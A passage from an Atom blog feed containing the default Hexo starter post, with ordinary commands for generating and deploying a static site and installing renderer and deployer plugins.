href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="Addition-modules"><a href="#Addition-modules" class="headerlink" title="Addition modules"></a>Addition modules</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-scss --save</span><br><span class="line">npm install hexo-renderer-swig --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories</span><br><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
